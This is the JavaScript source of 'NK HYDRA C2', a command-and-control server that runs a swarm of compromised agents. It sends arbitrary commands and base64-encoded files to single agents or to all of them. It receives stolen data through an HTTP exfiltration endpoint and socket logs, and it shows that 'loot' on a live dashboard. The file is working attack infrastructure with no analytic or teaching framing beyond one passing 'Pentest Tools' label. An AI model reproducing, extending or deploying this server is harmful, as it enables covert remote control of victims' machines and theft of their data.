// NK HYDRA C2 SERVER v6.5 (Dashboard Enabled)
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" }, maxHttpBufferSize: 1e8 }); 

app.use(cors());
app.use(express.json());

let agents = new Map();
let loot = [];

// 1. TACTICAL DASHBOARD (Root Route Fix)
app.get('/', (req, res) => {
    const uptime = process.uptime();
    const agentsList = Array.from(agents.keys()).join(', ') || 'None';
    
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>NK HYDRA C2 // STATUS</title>
        <style>
            body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 2rem; margin: 0; }
            .container { max-width: 800px; margin: 0 auto; border: 1px solid #333; padding: 2rem; background: #0a0a0a; box-shadow: 0 0 20px rgba(0, 255, 65, 0.1); }
            h1 { border-bottom: 2px solid #00ff41; padding-bottom: 1rem; margin-top: 0; text-shadow: 0 0 5px #00ff41; font-size: 1.5rem; display: flex; justify-content: space-between; }
            .status-dot { color: #00ff41; animation: blink 1s infinite; }
            .section { margin-bottom: 2rem; }
            .label { color: #666; font-size: 0.8rem; font-weight: bold; display: block; margin-bottom: 0.5rem; }
            .value { font-size: 1.2rem; }
            .loot-box { background: #000; border: 1px solid #222; padding: 1rem; height: 200px; overflow-y: auto; font-size: 0.9rem; }
            .loot-item { margin-bottom: 0.5rem; border-bottom: 1px solid #111; padding-bottom: 0.5rem; }
            .timestamp { color: #888; margin-right: 1rem; }
            @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
            ::-webkit-scrollbar { width: 8px; }
            ::-webkit-scrollbar-track { background: #000; }
            ::-webkit-scrollbar-thumb { background: #333; }
        </style>
        <script>
             setTimeout(() => window.location.reload(), 5000); // Auto-refresh
        </script>
    </head>
    <body>
        <div class="container">
            <h1>NK HYDRA C2 <span class="status-dot">● ONLINE</span></h1>
            
            <div class="section">
                <span class="label">SERVER UPTIME</span>
                <span class="value">${Math.floor(uptime)}s</span>
            </div>

            <div class="section">
                <span class="label">ACTIVE SWARM NODES (${agents.size})</span>
                <div class="value" style="color: #fff">${agentsList}</div>
            </div>

            <div class="section">
                <span class="label">EXFILTRATED DATA (LOOT)</span>
                <div class="loot-box">
                    ${loot.map(l => `<div class="loot-item"><span class="timestamp">[${l.time}]</span>${l.data}</div>`).join('')}
                    ${loot.length === 0 ? '<div style="color:#444">Awaiting incoming data stream...</div>' : ''}
                </div>
            </div>
            
            <div style="font-size: 0.7rem; color: #444; margin-top: 2rem; text-align: right;">
                NK WARFARE SUITE v15.0 // PORT ${process.env.PORT || 3000}
            </div>
        </div>
    </body>
    </html>
    `);
});

// 2. API Endpoints for Pentest Tools
app.get('/api/status', (req, res) => {
    res.json({ status: 'online', agents: agents.size, uptime: process.uptime() });
});

app.get('/api/agents', (req, res) => {
    const list = [];
    agents.forEach((socketId, id) => list.push({ id, socketId }));
    res.json(list);
});

// 3. Webhook for HTTP Exfiltration
app.post('/exfil', (req, res) => {
    const data = req.body;
    console.log('[HTTP EXFIL]', data);
    loot.unshift({ time: new Date().toLocaleTimeString(), data: JSON.stringify(data).substring(0, 100) + '...' });
    if (loot.length > 50) loot.pop();
    io.emit('log', `[HTTP EXFIL] ${JSON.stringify(data)}`);
    res.send('ACK');
});

io.on('connection', (socket) => {
    // 1. Identificação
    socket.on('identify', ({ type, id }) => {
        if (type === 'agent') {
            agents.set(id, socket.id);
            console.log(`[+] AGENT ONLINE: ${id}`);
            io.emit('log', `[SYSTEM] NEW NODE DETECTED: ${id}`);
        } else {
            console.log('[+] COMMANDER UI CONNECTED');
        }
    });

    // 2. Comandos Gerais
    socket.on('cmd', (data) => {
        const { cmd, target } = data;
        if (target && target !== 'all') {
            const socketId = agents.get(target);
            if (socketId) {
                io.to(socketId).emit('exec', { cmd });
                io.emit('log', `[CMD] -> ${target}: ${cmd}`);
            } else {
                io.emit('log', `[ERR] Target ${target} not found.`);
            }
        } else {
            io.emit('exec', { cmd });
            io.emit('log', `[CMD] -> SWARM: ${cmd}`);
        }
    });

    // 3. Upload de Arquivos (UI -> Agent)
    socket.on('upload_file', (data) => {
        const { target, filename, b64content } = data;
        const payload = { cmd: `write_file ${filename} ${b64content}` };
        
        if (target && target !== 'all') {
            const socketId = agents.get(target);
            if (socketId) {
                io.to(socketId).emit('exec', payload);
                io.emit('log', `[UPLOAD] Sending ${filename} to ${target}...`);
            }
        } else {
            io.emit('exec', payload);
            io.emit('log', `[UPLOAD] Broadcasting ${filename} to SWARM...`);
        }
    });

    // 4. Logs e Exfiltração (Agent -> UI)
    socket.on('stream_log', (data) => {
        // Capture loot if marked
        if (data.output.includes('[DATA_START]') || data.output.includes('[SNIFFER]')) {
             loot.unshift({ time: new Date().toLocaleTimeString(), data: data.output.substring(0, 50) + '...' });
             if (loot.length > 50) loot.pop();
        }
        io.emit('log', `[${data.from}] ${data.output}`);
    });

    socket.on('disconnect', () => {
       agents.forEach((val, key) => {
           if(val === socket.id) agents.delete(key);
       });
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`NK HYDRA C2 running on port ${PORT}`));